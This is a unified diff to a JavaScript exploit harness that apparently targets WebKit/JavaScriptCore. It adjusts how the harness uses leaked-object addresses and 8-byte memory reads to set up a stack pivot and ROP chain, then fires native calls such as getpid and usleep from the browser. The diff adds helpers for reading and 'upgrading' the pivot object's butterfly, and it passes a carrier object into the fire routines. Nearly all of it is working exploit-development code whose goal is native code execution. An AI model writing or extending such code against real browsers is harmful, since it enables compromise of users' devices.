@@ -81,17 +81,18 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     verifyPivotHookWrites,
     verifySlabContent, resolveBufAddrOff, verifyStackContent,
+    readPivotButterfly, ensurePivotButterfly,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ay";
+const BUILD_ID = "rw-20250830az";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
     { id: "smoke-g30", label: "N0g+30", title: "getpid hook cell+0x30 (rsi=cell?)" },
-    { id: "smoke-gbf", label: "N0g bf0", title: "getpid hook butterfly+0" },
-    { id: "smoke-gbf30", label: "N0g bf30", title: "getpid hook butterfly+0x30" },
+    { id: "smoke-gbf", label: "N0g bf0", title: "getpid hook butterfly+0 (auto-upgrades empty {} → props/ta)" },
+    { id: "smoke-gbf30", label: "N0g bf30", title: "getpid hook butterfly+0x30 (auto-upgrades pivot if needed)" },
     { id: "prep", label: "N1 prep", title: "skip if PREP-PIN @ Start (?freshprep=1 to redo)" },
     { id: "layout-smoke", label: "N2 layout", title: "write smoke ROP stack (no JSC writes)" },
     { id: "slab-chain", label: "N2c slab", title: "verify slab addrs + store/pivot memory match (no fire)" },
@@ -4186,7 +4187,7 @@ function tryNativeFireAtStart(p, off) {
         if (nm === "smoke") {
             mark("NATIVE-FIRE", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
             renderOut();
-            firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
+            firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
             mark("NATIVE-OK", "pivot smoke @ Start (webkit only) build=" + BUILD_ID);
             state("pivot smoke OK — chain works", "ok");
             return;
@@ -4202,7 +4203,7 @@ function tryNativeFireAtStart(p, off) {
                 + " stub+0x" + stub.off.toString(16));
             renderOut();
             stageGetpid(p, nativePrep, lk, off, stub.off);
-            fireNativeCall(p, nativePrep, off, { hook: pivotHookMode() });
+            fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
             mark("NATIVE-OK", "getpid @ Start lk=" + lk + " build=" + BUILD_ID);
         } else {
             mark("NATIVE-FIRE", "usleep @ PRIMITIVE-OK lk=" + lk);
@@ -4350,9 +4351,8 @@ function bisectLogPreflight(p, prep, pf, tag) {
         + " rsp=" + (pf.slab && pf.slab.rsp ? pf.slab.rsp.ok : "?")
         + " mainMf=" + prep.mainMf
         + " path=" + (prep._cap && prep._cap.path || "?"));
-    let bf = null;
-    try { bf = p.read8(prep.pivotCell.add32(0x8)); } catch (_) { bf = null; }
-    bisectLog("PRE-PIVOT", "cell=" + prep.pivotCell + " butterfly=" + bf
+    let bf = readPivotButterfly(p, prep.pivotCell);
+    bisectLog("PRE-PIVOT", "cell=" + prep.pivotCell + " butterfly=" + (bf || "null")
         + " S=" + prep.M.S + " G0=" + prep.G.G0 + " hook=" + pivotHookMode());
     if (pf.slabContent && !pf.slabContent.ok)
         bisectLog("PRE-SLAB-BAD", pf.slabContent.reasons.join("; "));
@@ -4376,7 +4376,7 @@ function bisectRunPoopsAtomic(p, off, tag) {
         throw new Error("preflight: " + pf.reasons.join("; "));
     bisectFlushBeforeFire();
     bisectLog("BISECT-WARN", tag + " fireNativeCall hook=" + pivotHookMode() + "…");
-    return fireNativeCall(p, nativePrep, off, { hook: pivotHookMode() });
+    return fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
 }
 
 /** Manual hook then expm1 (no auto-restore) — for multi/bf hunts. */
@@ -4388,7 +4388,7 @@ function bisectRunHookFire(p, off, hookFn, hookOffs, tag) {
     bisectLogPreflight(p, nativePrep, pf, tag);
     if (!pf.ok)
         throw new Error("preflight: " + pf.reasons.join("; "));
-    hookFn(p, nativePrep, hookOffs);
+    hookFn(p, nativePrep, hookOffs, window._wkCarrier || null);
     const hv = nativePrep._bisect && nativePrep._bisect.multiSaved
         ? verifyPivotHookSaved(p, nativePrep)
         : verifyPivotHookWrites(p, nativePrep, hookOffs || G0_HOOK_POOPS);
@@ -4418,6 +4418,8 @@ function pivotObjForPrep(carrier, prep) {
     const mode = params.get("pivot") || "empty";
     if (mode === "ta" && carrier && carrier.textarea)
         return carrier.textarea;
+    if (mode === "props")
+        return { __p0: 1, __p1: 2, __p2: 3, __p3: 4, __p4: 5 };
     if (prep && prep.M && prep.M.bufs) {
         if (mode === "store" && prep.M.bufs[0]) return prep.M.bufs[0];
         if (mode === "pb" && prep.M.bufs[1]) return prep.M.bufs[1];
@@ -4429,6 +4431,8 @@ function finishPivotObj(p, prep, carrier) {
     const obj = pivotObjForPrep(carrier, prep);
     prep.pivotObj = obj;
     prep.pivotCell = p.leakval(obj);
+    prep._carrier = carrier || null;
+    prep._pivotBfUpgraded = null;
     if (prep.keepAlive.indexOf(obj) < 0)
         prep.keepAlive.push(obj);
     return obj;
@@ -4440,13 +4444,19 @@ function bisectPreFireLog(p, prep, lk, stubOff, tag, hookMode) {
         const sv = read8p(p, lk.add32(stubOff));
         stubOk = lkIsGetpidStub(sv) ? "stub-ok" : ("BAD:" + sv);
     }
-    let bf = null;
-    try { bf = p.read8(prep.pivotCell.add32(0x8)); } catch (_) { bf = null; }
+    let bf = readPivotButterfly(p, prep.pivotCell);
+    let bfStr = bf ? String(bf) : "null";
+    if (prep._pivotBfUpgraded)
+        bfStr += " upgraded=" + prep._pivotBfUpgraded;
     bisectLog("PRE-FIRE", tag + " lk=" + lk + " +0x" + (stubOff != null ? stubOff.toString(16) : "?")
         + " " + stubOk + " hook=" + hookMode
         + " pivot=" + (params.get("pivot") || "empty")
-        + " cell=" + prep.pivotCell + " bf=" + bf + " S=" + prep.M.S
+        + " cell=" + prep.pivotCell + " bf=" + bfStr + " S=" + prep.M.S
         + " path=" + (prep._cap && prep._cap.path || "?"));
+}
+
+function nativeFireOpts(hookMode) {
+    return { hook: hookMode, carrier: window._wkCarrier || null };
 }
 
 function bisectFireGetpidHook(p, off, hookMode, tag) {
@@ -4455,9 +4465,11 @@ function bisectFireGetpidHook(p, off, hookMode, tag) {
     const stub = resolveGetpidStubOff(p, lk, off);
     if (stub.tag === "blind")
         bisectLog("STUB-WARN", "getpid stub not verified — may OOM");
+    if (hookMode === "bf" || hookMode === "bf30" || hookMode === "dual")
+        ensurePivotButterfly(p, nativePrep, window._wkCarrier || null);
     bisectPreFireLog(p, nativePrep, lk, stub.off, tag, hookMode);
     bisectFlushBeforeFire();
-    return firePivotGetpid(p, nativePrep, lk, off, stub.off, { hook: hookMode });
+    return firePivotGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(hookMode));
 }
 
 function codeLooksNative(code4) {
@@ -4925,7 +4937,7 @@ function runFireGetpid() {
     const kind = nm === "smoke" ? "smoke" : (nm === "usleep" ? "usleep+13b20" : "getpid");
     try {
         if (nm === "smoke") {
-            firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
+            firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
         } else if (nm === "usleep") {
             pid = fireUsleep(p, nativePrep, lk, off, 1000);
         } else {
@@ -5198,7 +5210,7 @@ async function runStart() {
                 mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
                 renderOut();
                 try {
-                    firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
+                    firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
                     mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
                     state("pivot smoke OK @ Start", "ok");
                 } catch (smokeErr) {
